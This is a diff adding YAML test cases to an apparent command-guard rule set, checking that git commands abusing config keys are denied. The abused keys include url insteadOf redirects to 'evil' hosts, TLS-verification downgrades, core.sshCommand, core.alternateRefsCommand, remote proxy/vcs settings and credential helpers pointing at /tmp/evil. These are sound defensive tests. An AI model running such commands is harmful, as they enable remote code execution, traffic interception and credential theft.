@@ -1369,6 +1369,69 @@ tests:
     # joined-form rule had no min_args carve-out. Fix splits the URL-base
     # pattern only on the joined-form rule.
 
+  # ============================================================
+  # R4 (Codex) findings — none_of: ["config"] carve-out bypass via
+  # positional `config` arg; missed keys (alternateRefsCommand, remote.vcs,
+  # remote.proxy)
+  # ============================================================
+
+  # --- The none_of: ["config"] carve-out on -c / TLS rules must NOT fire
+  # when `config` appears as a positional arg of a non-config subcommand.
+  # Pre-fix: `git -c X clone URL config` (where `config` is a refspec/
+  # remote name) suppressed the rule entirely → allow. ---
+  - id: git-c-fetch-with-positional-config-arg-deny
+    command: "git -c url.https://evil/.insteadOf=https://github.com/ fetch config"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-c-clone-with-positional-config-arg-deny
+    command: "git -c http.sslVerify=false clone https://example.com/repo config"
+    expected:
+      decision: deny
+      rule_id: git-c-tls-downgrade
+  - id: git-c-fetch-sslverify-0-with-config-arg-deny
+    command: "git -c http.sslVerify=0 fetch config"
+    expected:
+      decision: deny
+      rule_id: git-c-tls-downgrade
+  - id: git-config-env-fetch-with-positional-config-arg-deny
+    command: "EVIL=evil git --config-env=core.sshCommand=EVIL fetch config"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+
+  # --- Additional RCE / per-remote keys missed (R4 Codex P1-2) ---
+  - id: git-c-core-alternaterefscommand-deny
+    command: "git -c core.alternateRefsCommand=/tmp/evil fetch"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-config-set-core-alternaterefscommand-deny
+    command: "git config core.alternateRefsCommand /tmp/evil"
+    expected:
+      decision: deny
+      rule_id: git-config-rce-keys-spaceform
+  - id: git-c-remote-vcs-deny
+    command: "git -c remote.origin.vcs=evil fetch origin"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-c-remote-proxy-deny
+    command: "git -c remote.origin.proxy=http://evil:8080 fetch origin"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-config-set-remote-vcs-deny
+    command: "git config remote.origin.vcs evil"
+    expected:
+      decision: deny
+      rule_id: git-config-rce-keys-spaceform
+  - id: git-config-set-remote-proxy-deny
+    command: "git config remote.origin.proxy http://evil:8080"
+    expected:
+      decision: deny
+      rule_id: git-config-rce-keys-spaceform
+
   # --- Credential URL: any scheme denies via `credential.*://**` ---
   - id: git-c-credential-arbitrary-scheme-deny
     command: "git -c credential.gopher://x.com.helper=/tmp/evil fetch"
